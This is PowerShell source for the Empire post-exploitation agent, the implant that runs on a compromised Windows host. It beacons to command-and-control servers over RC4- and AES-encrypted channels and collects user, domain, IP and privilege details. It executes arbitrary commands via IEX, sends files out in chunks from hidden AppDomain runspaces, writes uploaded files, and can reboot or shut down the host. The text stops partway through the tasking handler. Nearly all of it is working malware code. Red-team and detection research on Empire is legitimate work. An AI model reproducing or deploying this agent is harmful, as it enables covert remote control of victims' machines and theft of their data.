
function Invoke-Empire {
    <#
        .SYNOPSIS
        The main functionality of the Empire agent.
        Additional functionality can be loaded dynamically.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER StagingKey
        The server staging key.

        .PARAMETER SessionKey
        Client-specific AES session key to use for communications

        .PARAMETER SessionID
        A unique alphanumeric sessionID to use for identification

        .PARAMETER Servers
        Array of C2 servers to use

        .PARAMETER KillDate
        Kill date limit for agent operation

        .PARAMETER KillDays
        Number of days for the bot to operate until exit

        .PARAMETER WorkingHours
        Working hours for agent operation, format "8:00,17:00"

        .PARAMETER Profile
        http communication profile
        request_uris(comma separated)|UserAgents(comma separated)

        .PARAMETER LostLimit
        The limit of the number of checkins the agent will miss before exiting

        .PARAMETER DefaultResponse
        A base64 representation of the default response for the given transport.
    #>

    param(
        [Parameter(Mandatory=$true)]
        [String]
        $StagingKey,

        [Parameter(Mandatory=$true)]
        [String]
        $SessionKey,

        [Parameter(Mandatory=$true)]
        [String]
        $SessionID,

        [Int32]
        $AgentDelay = 60,

        [Double]
        $AgentJitter = 0,

        [String[]]
        $Servers,

        [String]
        $KillDate,

        [Int32]
        $KillDays,

        [String]
        $WorkingHours,

        [String]
        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

        [Int32]
        $LostLimit = 60,

        [String]
        $DefaultResponse = ""
    )

    ############################################################
    #
    # Configuration data
    #
    ############################################################

    $Encoding = [System.Text.Encoding]::ASCII
    $HMAC = New-Object System.Security.Cryptography.HMACSHA256

    $script:AgentDelay = $AgentDelay
    $script:AgentJitter = $AgentJitter
    $script:LostLimit = $LostLimit
    $script:MissedCheckins = 0
    $script:ResultIDs = @{}
    $script:WorkingHours = $WorkingHours
    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))

    # the currently active server
    $Script:ServerIndex = 0
    $Script:ControlServers = $Servers

    # the number of times to retry server connections, i.e. the 'lost limit
    $Retries = 1

    # set a kill date of $KillDays out if specified
    if($KillDays) {
        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
    }

    # get all the headers/etc. in line for our comms
    #   Profile format:
    #       uris(comma separated)|UserAgent|header1=val|header2=val2...
    #       headers are optional. format is "key:value"
    #       ex- cookies are "cookie:blah=123;meh=456"
    $ProfileParts = $Profile.split('|')
    $script:TaskURIs = $ProfileParts[0].split(',')
    $script:UserAgent = $ProfileParts[1]
    $script:SessionID = $SessionID
    $script:Headers = @{}
    # add any additional request headers if there are any specified in the profile
    if($ProfileParts[2]) {
        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
            $Parts = $_.Split(':')
            $script:Headers.Add($Parts[0],$Parts[1])
        }
    }

    # keep track of all background jobs
    #   format: {'RandomJobName' : @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}, ... }
    $Script:Jobs = @{}
    $Script:Downloads = @{}
    # the currently imported script held in memory
    $script:ImportedScript = ''

    ############################################################
    #
    # Command Helpers
    #
    ############################################################

    function ConvertTo-Rc4ByteStream {
        # RC4 encryption/decryption
        #   used in New-RoutingPacket/Decode-RoutingPacket
        Param ($In, $RCK)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Get-HexString {
        param([byte]$Data)
        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
    }

    function Set-Delay {
        param([int]$d, [double]$j=0.0)
        $script:AgentDelay = $d
        $script:AgentJitter = $j
        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter"
    }

    function Get-Delay {
        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter"
    }

    function Set-LostLimit {
        param([int]$l)
        $script:LostLimit = $l
        if($l -eq 0)
        {
            "agent set to never die based on checkin Limit"
        }
        else
        {
            "agent LostLimit set to $script:LostLimit"
        }
    }

    function Get-LostLimit {
        "agent LostLimit: $script:LostLimit"
    }

    function Set-Killdate {
        param([string]$date)
        $script:KillDate = $date
        "agent killdate set to $script:KillDate"
    }

    function Get-Killdate {
        "agent killdate: $script:KillDate"
    }

    function Set-WorkingHours {
        param([string]$hours)
        $script:WorkingHours = $hours
        "agent working hours set to $($script:WorkingHours)"
    }

    function Get-WorkingHours {
        "agent working hours: $($script:WorkingHours)"
    }

    function Get-Sysinfo {
        $str = '0|' # no nonce for normal execution
        $str += $Script:ControlServers[$Script:ServerIndex]
        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
        #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
        $str+="|$ip"

        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
        # if we're SYSTEM, we're high integrity
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $str += '|True'
        }
        else{
            # otherwise check the token groups
            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        }
        $n = [System.Diagnostics.Process]::GetCurrentProcess();
        $str += '|'+$n.ProcessName+'|'+$n.Id;
        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
        $str
    }

    # # TODO: add additional callback servers ?
    # function Add-Servers {
    #     param([string[]]$BackupServers)
    #     foreach ($backup in $BackupServers) {
    #         $Script:ControlServers = $Script:ControlServers + $backup
    #     }
    # }

    # handle shell commands and return any results
    function Invoke-ShellCommand {
        param($cmd, $cmdargs="")

        # UNC path normalization for PowerShell
        if ($cmdargs -like "*`"\\*") {
            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\"
        }
        elseif ($cmdargs -like "*\\*") {
            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\"
        }

        $output = ''
        if ($cmd.ToLower() -eq 'shell') {
            # if we have a straight 'shell' command, skip the aliases
            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
            else { $output = IEX "$cmdargs" }
            $output += "`n`r..Command execution completed."
        }
        else {
            switch -regex ($cmd) {
                '(ls|dir)' {
                    if ($cmdargs.length -eq "") {
                        $output = Get-ChildItem -force | select lastwritetime,length,name
                    }
                    else {
                        try{
                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
                        }
                        catch [System.Management.Automation.ActionPreferenceStopException] {
                            $output = "[!] Error: $_ (or cannot be accessed)."
                        }
                    }
                }
                '(mv|move|copy|cp|rm|del|rmdir)' {
                    if ($cmdargs.length -ne "") {
                        try {
                            IEX "$cmd $cmdargs -Force -ErrorAction Stop"
                            $output = "executed $cmd $cmdargs"
                        }
                        catch {
                            $output=$_.Exception;
                        }
                    }
                }
                cd {
                    if ($cmdargs.length -ne '')
                    {
                        $cmdargs = $cmdargs.trim("`"").trim("'")
                        cd "$cmdargs"
                        $output = pwd
                    }
                }
                '(ipconfig|ifconfig)' {
                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Description' $_.Description
                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                        $out
                    } | fl | Out-String | ForEach-Object {$_ + "`n"}
                }
                # this is stupid how complicated it is to get this information...
                '(ps|tasklist)' {
                    $owners = @{}
                    Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
                    if($cmdargs -ne '') { $p = $cmdargs }
                    else{ $p = "*" }
                    $output = Get-Process $p | ForEach-Object {
                        $arch = 'x64'
                        if ([System.IntPtr]::Size -eq 4) {
                            $arch = 'x86'
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                    $arch = 'x86'
                                    break
                                }
                            }
                        }
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $out | Add-Member Noteproperty 'PID' $_.ID
                        $out | Add-Member Noteproperty 'Arch' $arch
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
                        $mem = "{0:N2} MB" -f $($_.WS/1MB)
                        $out | Add-Member Noteproperty 'MemUsage' $mem
                        $out
                    } | Sort-Object -Property PID
                }
                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                route {
                    if (($cmdargs.length -eq '') -or ($cmdargs.lower() -eq 'print')) {
                        # build a table of adapter interfaces indexes -> IP address for the adapater
                        $adapters = @{}
                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
                            $out = New-Object psobject
                            $out | Add-Member Noteproperty 'Destination' $_.Destination
                            $out | Add-Member Noteproperty 'Netmask' $_.Mask
                            if ($_.NextHop -eq "0.0.0.0") {
                                $out | Add-Member Noteproperty 'NextHop' 'On-link'
                            }
                            else{
                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop
                            }
                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
                            }
                            else {
                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
                            }
                            $out | Add-Member Noteproperty 'Metric' $_.Metric1
                            $out
                        } | ft -autosize | Out-String
                        
                    }
                    else { $output = route $cmdargs }
                }
                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
                hostname {
                    $output = [System.Net.Dns]::GetHostByName(($env:computerName))
                }
                '(reboot|restart)' { Restart-Computer -force }
                shutdown { Stop-Computer -force }
                default {
                    if ($cmdargs.length -eq '') { $output = IEX $cmd }
                    else { $output = IEX "$cmd $cmdargs" }
                }
            }
        }
        "`n"+($output | Format-Table -wrap | Out-String)
    }

    #Download file script block that will run in the background

    $Download = @"
function Download-File {
    param(`$Type,`$Path,`$ResultID,`$ChunkSize,`$Delay,`$Jitter)

    `$Index = 0
    do{
        `$EncodedPart = Get-FilePart -File "`$Path" -Index `$Index -ChunkSize `$ChunkSize
        if (`$EncodedPart) {
            `$data = "{0}|{1}|{2}" -f `$Index,`$Path,`$EncodedPart
            Encode-Packet -type `$Type -data `$(`$data) -ResultID `$ResultID
            `$Index += 1

            if (`$Delay -ne 0) {
                `$min = [int]((1-`$Jitter)*`$Delay)
                `$max = [int]((1+`$Jitter)*`$Delay)

                if (`$min -eq `$max) {
                    `$sleepTime = `$min
                }
                else {
                    `$sleepTime = Get-Random -minimum `$min -maximum `$max;
                }
                Start-Sleep -s `$sleepTime;
            }
        }
        [GC]::Collect()
    } while(`$EncodedPart)

    Encode-Packet -type 40 -data "[*] File download of `$Path completed" -ResultID `$ResultID
}

function Encode-Packet {
    param([Int16]`$type, `$data, [Int16]`$ResultID=0)
    <# 
        encode a packet for transport:
        +------+--------------------+----------+---------+--------+-----------+
        | Type | total # of packets | packet # | task ID | Length | task data |
        +------+--------------------+--------------------+--------+-----------+
        |  2   |         2          |    2     |    2    |   4    | <Length>  |
        +------+--------------------+----------+---------+--------+-----------+
    #>

    # in case we get a result array, make sure we join everything up
    if (`$data -is [System.Array]) {
        `$data = `$data -join "``n"
    }

    # convert data to base64 so we can support all encodings and handle on server side
    `$data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$data))

    `$packet = New-Object Byte[] (12 + `$data.Length)

    # packet type
    ([BitConverter]::GetBytes(`$type)).CopyTo(`$packet, 0)
    # total number of packets
    ([BitConverter]::GetBytes([Int16]1)).CopyTo(`$packet, 2)
    # packet number
    ([BitConverter]::GetBytes([Int16]1)).CopyTo(`$packet, 4)
    # task/result ID
    ([BitConverter]::GetBytes(`$ResultID)).CopyTo(`$packet, 6)
    # length
    ([BitConverter]::GetBytes(`$data.Length)).CopyTo(`$packet, 8)
    ([System.Text.Encoding]::UTF8.GetBytes(`$data)).CopyTo(`$packet, 12)

    `$packet
}

function Get-FilePart {
    Param(
        [string] `$File,
        [int] `$Index = 0,
        `$ChunkSize = 512KB,
        [switch] `$NoBase64
    )

    try {
        `$f = Get-Item "`$File"
        `$FileLength = `$f.length
        `$FromFile = [io.file]::OpenRead(`$File)

        if (`$FileLength -lt `$ChunkSize) {
            if(`$Index -eq 0) {
                `$buff = new-object byte[] `$FileLength
                `$count = `$FromFile.Read(`$buff, 0, `$buff.Length)
                if(`$NoBase64) {
                    `$buff
                }
                else{
                    [System.Convert]::ToBase64String(`$buff)
                }
            }
            else{
                `$Null
            }
        }
        else{
            `$buff = new-object byte[] `$ChunkSize
            `$Start = `$Index * `$(`$ChunkSize)

            `$null = `$FromFile.Seek(`$Start,0)

            `$count = `$FromFile.Read(`$buff, 0, `$buff.Length)

            if (`$count -gt 0) {
                if(`$count -ne `$ChunkSize) {
                    # if we're on the last file chunk

                    # create a new array of the appropriate length
                    `$buff2 = new-object byte[] `$count
                    # and copy the relevant data into it
                    [array]::copy(`$buff, `$buff2, `$count)

                    if(`$NoBase64) {
                        `$buff2
                    }
                    else{
                        [System.Convert]::ToBase64String(`$buff2)
                    }
                }
                else{
                    if(`$NoBase64) {
                        `$buff
                    }
                    else{
                        [System.Convert]::ToBase64String(`$buff)
                    }
                }
            }
            else{
                `$Null;
            }
        }
    }
    catch{}
    finally {
        `$FromFile.Close()
    }
}
"@

    function Start-DownloadJob {
        param($ScriptString, $type, $Path, $ResultID, $ChunkSize)

        $RandName = Split-Path -Path $Path -Leaf
        # create our new AppDomain
        $AppDomain = [AppDomain]::CreateDomain($RandName)

        # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()

        $ScriptString = "$ScriptString`n Download-File -Type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"

        # add the target script into the new runspace/appdomain
        $null = $PSHost.AddScript($ScriptString)

        # stupid v2 compatibility...
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]'
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))

        # kick off asynchronous execution
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))

        $Script:Downloads[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
        $RandName
    }

    # returns $True if the specified job is completed, $False otherwise
    function Get-DownloadJobCompleted {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            $Script:Downloads[$JobName]['Job'].IsCompleted
        }
    }

    # reads any data from the output buffer preserved for the specified job
    function Receive-DownloadJob {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            $Script:Downloads[$JobName]['Buffer'].ReadAll()
        }
    }

    # stops the specified agent job (wildcards accepted), returns any job results,
    #   tear down the appdomain, and remove the job from the internal cache
    function Stop-DownloadJob {
        param($JobName)
        if($Script:Downloads.ContainsKey($JobName)) {
            # kill the PS host
            $Null = $Script:Downloads[$JobName]['PSHost'].Stop()
            # get results
            $Script:Downloads[$JobName]['Buffer'].ReadAll()
            # unload the app domain runner
            $Null = [AppDomain]::Unload($Script:Downloads[$JobName]['AppDomain'])
            $Script:Downloads.Remove($JobName)
        }
    }

    # takes a string representing a PowerShell script to run, build a new
    #   AppDomain and PowerShell runspace, and kick off the execution in the
    #   new runspace/AppDomain asynchronously, storing the results in $Script:Jobs.
    function Start-AgentJob {
        param($ScriptString)

        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)

        # create our new AppDomain
        $AppDomain = [AppDomain]::CreateDomain($RandName)

        # load the PowerShell dependency assemblies in the new runspace and instantiate a PS runspace
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()

        # add the target script into the new runspace/appdomain
        $null = $PSHost.AddScript($ScriptString)

        # stupid v2 compatibility...
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]'
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))

        # kick off asynchronous execution
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))

        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer}
        $RandName
    }

    # returns $True if the specified job is completed, $False otherwise
    function Get-AgentJobCompleted {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            $Script:Jobs[$JobName]['Job'].IsCompleted
        }
    }

    # reads any data from the output buffer preserved for the specified job
    function Receive-AgentJob {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            $Script:Jobs[$JobName]['Buffer'].ReadAll()
        }
    }

    # stops the specified agent job (wildcards accepted), returns any job results,
    #   tear down the appdomain, and remove the job from the internal cache
    function Stop-AgentJob {
        param($JobName)
        if($Script:Jobs.ContainsKey($JobName)) {
            # kill the PS host
            $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
            # get results
            $Script:Jobs[$JobName]['Buffer'].ReadAll()
            # unload the app domain runner
            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
            $Script:Jobs.Remove($JobName)
        }
    }

    # update the http comms profile
    function Update-Profile {
        param($Profile)

        # format:
        #   uris(comma separated)|UserAgent|header1=val|header2=val2...
        #   headers are optional. format is "key:value"
        #   ex- cookies are "cookie:blah=123;meh=456"

        $ProfileParts = $Profile.split('|')
        $script:TaskURIs = $ProfileParts[0].split(',')
        $script:UserAgent = $ProfileParts[1]
        $script:SessionID = $SessionID
        $script:Headers = @{}

        # add any additional request headers if there are any specified in the profile
        if($ProfileParts[2]) {
            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
                $Parts = $_.Split(':')
                $script:Headers.Add($Parts[0],$Parts[1])
            }
        }

        "Agent updated with profile $Profile"
    }

    # get a binary part of a file based on $Index and $ChunkSize
    # and return a base64 encoding of that file part (by default)
    # used by download functionality for large file


    ############################################################
    #
    # Core agent encryption/packet processing function
    #
    ############################################################

    function Encrypt-Bytes {
        param($bytes)
        # get a random IV
        $IV = [byte] 0..255 | Get-Random -count 16
        try {
            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        }
        catch {
            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
        }
        $AES.Mode = "CBC";
        $AES.Key = $Encoding.GetBytes($SessionKey);
        $AES.IV = $IV;
        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
        # append the MAC
        $HMAC.Key = $Encoding.GetBytes($SessionKey);
        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
    }

    function Decrypt-Bytes {
        param ($inBytes)
        if($inBytes.Length -gt 32) {
            # Verify the HMAC
            $mac = $inBytes[-10..-1];
            $inBytes = $inBytes[0..($inBytes.length - 11)];
            $hmac.Key = $Encoding.GetBytes($SessionKey);
            $expected = $hmac.ComputeHash($inBytes)[0..9];
            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
                return;
            }

            # extract the IV
            $IV = $inBytes[0..15];
            try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = "CBC";
            $AES.Key = $Encoding.GetBytes($SessionKey);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
        }
    }

    function New-RoutingPacket {
        param($EncData, $Meta)

        # build the RC4 routing packet
        #   Meta:
        #       TASKING_REQUEST = 4
        #       RESULT_POST = 5

        if($EncData) {
            $EncDataLen = $EncData.Length
        }
        else {
            $EncDataLen = 0
        }

        $SKB = $Encoding.GetBytes($StagingKey)
        $IV=[BitConverter]::GetBytes($(Get-Random));
        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen)
        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB)

        if($EncData) {
            ($IV + $RoutingPacketData + $EncData)
        }
        else {
            ($IV + $RoutingPacketData)
        }
    }

    function Decode-RoutingPacket {
        param($PacketData)

        <#
        Decode a first level server-response "routing packet"

            Routing packet structure:

                [4 bytes randomIV]
                RC4s(
                    [8 bytes for sessionID]
                    [1 byte for language]
                    [1 byte for meta info]
                    [2 bytes for extra info]
                    [4 bytes for packet length]
                )
        #>

        if ($PacketData.Length -ge 20) {

            $Offset = 0

            while($Offset -lt $PacketData.Length) {
                # extract out the routing packet fields
                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)]
                $RoutingIV = $RoutingPacket[0..3]
                $RoutingEncData = $RoutingPacket[4..19]
                $Offset += 20

                # get the staging key bytes
                $SKB = $Encoding.GetBytes($StagingKey)

                # decrypt the routing packet
                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB)
                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7])
                # write-host "PacketSessionID: $PacketSessionID"
                # write-host "RoutingData len: $($RoutingData)"
                # write-host "$([System.BitConverter]::ToString($RoutingData[0..15]))"
                $Language = $RoutingData[8]
                $Meta = $RoutingData[9]
                # write-host "Meta: $Meta"
                $Extra = $RoutingData[10..11]
                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12)
                
                if ($PacketLength -lt 0) {
                    # Write-Host "Invalid PacketLength: $PacketLength"
                    break
                }

                if ($PacketSessionID -eq $script:SessionID) {
                    # if this tasking is for us
                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)]
                    $Offset += $PacketLength
                    Process-TaskingPackets $EncData
                }
                else {
                    # TODO: forward taskings on to other clients?
                }
            }
        }
        else {
            # Write-Host "Invalid PacketData.Length: $($PacketData.Length)"
        }
    }

    function Encode-Packet {
        param([Int16]$type, $data, [Int16]$ResultID=0)
        <# 
            encode a packet for transport:
            +------+--------------------+----------+---------+--------+-----------+
            | Type | total # of packets | packet # | task ID | Length | task data |
            +------+--------------------+--------------------+--------+-----------+
            |  2   |         2          |    2     |    2    |   4    | <Length>  |
            +------+--------------------+----------+---------+--------+-----------+
        #>

        # in case we get a result array, make sure we join everything up
        if ($data -is [System.Array]) {
            $data = $data -join "`n"
        }

        # convert data to base64 so we can support all encodings and handle on server side
        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))

        $packet = New-Object Byte[] (12 + $data.Length)

        # packet type
        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0)
        # total number of packets
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2)
        # packet number
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4)
        # task/result ID
        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6)
        # length
        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8)
        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12)

        $packet
    }

    function Decode-Packet {
        param($packet, $offset=0)
        # we're decoding the raw decrypted bytes to [type][# of packets][packet #][task ID][length][value][remaining packet data]
        # the calling logic can keep looking through the data blob,
        #   decoding additional packets as needed
        $Type = [BitConverter]::ToUInt16($packet, 0+$offset)
        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset)
        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset)
        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset)
        $Length = [BitConverter]::ToUInt32($packet, 8+$offset)
        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)])
        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)])

        Remove-Variable packet;

        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining)
    }


    ############################################################
    #
    # C2 functions
    #
    ############################################################

    REPLACE_COMMS

    # process a single tasking packet extracted from a tasking and execute the functionality
    function Process-Tasking {
        param($type, $msg, $ResultID)

        try {
            # sysinfo request
            if($type -eq 1) {
                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID
            }
            # agent exit
            elseif($type -eq 2) {
                $msg = "[!] Agent "+$script:SessionID+" exiting"
                # this is the only time we send a message out of the normal process,
                #   because we're exited immediately after
                Send-Message -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID)
                exit
            }
            # shell command
            elseif($type -eq 40) {
                $parts = $data.Split(" ")
                # if the command has no arguments
                if($parts.Length -eq 1) {
                    $cmd = $parts[0]
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID
                }
                # if the command has arguments
                else{
                    $cmd = $parts[0]
                    $cmdargs = $parts[1..$parts.length] -join " "
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID
                }
            }
            # file download
            elseif($type -eq 41) {
                
                try {
                    $ChunkSize = 128KB

                    $Parts = $Data.Split(" ")

                    if($Parts.Length -gt 1) {
                        $Path = $Parts[0..($parts.length-2)] -join " "
                        try {
                            $ChunkSize = $Parts[-1]/1
                            if($Parts[-1] -notlike "*b*") {
                                # if MB/KB not specified, assume KB and adjust accordingly
                                $ChunkSize = $ChunkSize * 1024
                            }
                        }
                        catch {
                            # if there's an error converting the last token, assume no
                            #   chunk size is specified and add the last token onto the path
                            $Path += " $($Parts[-1])"
                        }
                    }
                    else {
                        $Path = $Data
                    }

                    $Path = $Path.Trim('"').Trim("'")

                    # hardcoded floor/ceiling limits
                    if($ChunkSize -lt 64KB) {
                        $ChunkSize = 64KB
                    }
                    elseif($ChunkSize -gt 4MB) {
                        $ChunkSize = 4MB
                    }

                    # resolve the complete path
                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}

                    # read in and send the specified chunk size back for as long as the file has more parts
                    $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
                    
                }
                catch {
                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
                }
            }
            # file upload
            elseif($type -eq 42) {
                $parts = $data.split('|')
                $filename = $parts[0]
                $base64part = $parts[1]
                # get the raw file contents and save it to the specified location
                $Content = [System.Convert]::FromBase64String($base64part)
                try{
                    Set-Content -Path $filename -Value $Content -Encoding Byte
                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID
                }
                catch {
                    Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                }
            }

            # return the currently running jobs
            elseif($type -eq 50) {
                $Downloads = $Script:Jobs.Keys -join "`n"
                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID
            }

            # stop and remove a specific job if it's running
            elseif($type -eq 51) {
                $JobName = $data
                $JobResultID = $ResultIDs[$JobName]

                try {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                    # send result data if there is any
                    if($Results -and $($Results.trim() -ne '')) {
                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID
                    }
                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID
                }
                catch {
                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID
                }
            }

            #return downloads
            elseif($type -eq 52) {
                $RunningDownloads = $Script:Downloads.Keys -join "`n"
                Encode-Packet -data ("Downloads:`n$RunningDownloads") -type $type -ResultID $ResultID
            }

            #Cancel a download
            elseif($type -eq 53) {
                $JobName = $data
